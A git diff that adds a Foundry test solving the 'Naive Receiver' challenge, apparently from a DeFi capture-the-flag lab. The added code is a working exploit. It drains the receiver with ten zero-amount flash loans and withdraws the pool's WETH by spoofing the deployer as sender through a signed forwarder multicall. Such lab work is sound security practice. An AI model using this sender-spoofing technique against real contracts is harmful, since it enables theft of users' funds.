@@ -77,7 +77,26 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
+        bytes[] memory data = new bytes[](11);
+
+        // the last parameter in `abi.encodeWithSelector` is the msgSender you pretended to be -- it will be used by `NaiveReceiverPool._msgSender`.
+        for (uint i = 0; i < 10; i++)
+            data[i] = abi.encodeWithSelector(pool.flashLoan.selector, receiver, address(weth), 0, bytes(""), deployer);
+        data[10] = abi.encodeWithSelector(pool.withdraw.selector, 1010e18, payable(recovery), deployer);
         
+        BasicForwarder.Request memory request = BasicForwarder.Request({
+            from: address(player),
+            target: address(pool),
+            value: uint256(0x0),
+            gas: uint256(424577),
+            nonce: uint256(0x0),
+            data: abi.encodeWithSelector(pool.multicall.selector, data),
+            deadline: block.timestamp
+        });
+        bytes32 hash = _hashTypedData(forwarder.getDataHash(request));
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, hash); 
+        bytes memory signature = abi.encodePacked(r, s, v);
+        forwarder.execute(request, signature);
     }
 
     /**
@@ -95,5 +114,21 @@ contract NaiveReceiverChallenge is Test {
 
         // All funds sent to recovery account
         assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
+    }
+
+    // Copied and modified from https://github.com/Uniswap/permit2/blob/main/src/EIP712.sol
+    function _hashTypedData(bytes32 dataHash) internal view returns (bytes32) {
+        bytes32 typeHash = keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)");
+        bytes32 nameHash = keccak256(bytes("BasicForwarder"));
+        bytes32 versionHash = keccak256(bytes("1"));
+        bytes32 domainSeparator = keccak256(abi.encode(
+            typeHash,
+            nameHash,
+            versionHash,
+            block.chainid,
+            address(forwarder)
+        ));
+
+        return keccak256(abi.encodePacked("\x19\x01", domainSeparator, dataHash));
     }
 }
